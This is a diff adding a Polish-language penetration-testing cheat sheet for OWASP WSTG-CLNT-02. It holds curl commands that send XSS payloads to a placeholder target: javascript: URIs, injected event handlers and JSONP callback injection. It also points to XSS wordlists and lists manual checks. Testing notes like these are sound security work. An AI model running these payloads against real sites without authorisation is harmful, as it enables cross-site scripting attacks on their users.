@@ -1,0 +1,40 @@
+================================================================================
+WSTG-CLNT-02 — Testing for JavaScript Execution
+================================================================================
+CELE:
+- Identify sinks and possible JavaScript injection points
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Test javascript: URI ---
+curl -s "https://TARGET/redirect?url=javascript:alert(1)"
+curl -s "https://TARGET/page?link=javascript:alert(document.domain)"
+
+# --- Test event handlers ---
+curl -s "https://TARGET/page?input=\"onmouseover=\"alert(1)\""
+curl -s "https://TARGET/page?input='onfocus='alert(1)' autofocus='"
+
+# --- Test eval/Function context ---
+curl -s "https://TARGET/page?callback=alert(1)"
+curl -s "https://TARGET/api/data?callback=alert" # JSONP
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- PayloadsAllTheThings XSS ---
+# /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt
+# /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/0xcela_event_handlers.txt
+
+# --- fuzzdb event handlers ---
+# /home/parallels/Desktop/WSTG/fuzzdb-master/attack/xss/html-event-attributes.txt
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Szukaj javascript: URI w linkach i przekierowaniach
+2. Testuj event handlers w kontekstach HTML
+3. Sprawdz JSONP endpointy pod katem callback injection
+4. Analizuj kod JS pod katem eval(), Function(), setTimeout() z user input
